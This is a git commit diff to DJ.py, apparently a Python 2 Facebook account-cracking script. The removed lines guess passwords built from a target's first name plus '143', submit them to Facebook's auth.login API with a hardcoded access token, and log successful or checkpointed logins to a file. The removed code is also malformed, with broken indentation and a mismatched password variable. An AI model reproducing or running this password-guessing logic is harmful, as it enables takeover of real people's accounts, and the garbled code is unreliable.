2aac0651552d0e012e4f8223757bdf5a83c06945
FAKHAR143 <60933514+FAKHAR143@users.noreply.github.com>
2020-03-06 19:59:50 +0500

    Update DJ.py

--- DJ.py
+++ DJ.py
@@ -378,20 +378,7 @@ def pilih_super():
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass7)
-																	else:
-															                        pass8 = b['first_name'] + '143'
-															                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-															                            q = json.load(data)
-															                        if 'access_token' in q:
-															                         	print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
-																                      oks.append(user+pass8)
-															else:
-																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
-																	cek = open("out/checkpoint.txt", "a")
-																	cek.write(user+"|"+pass8+"\n")
-																	cek.close()
-																	cekpoint.append(user+pass8)
+													                             
 															
 		except:
 			pass
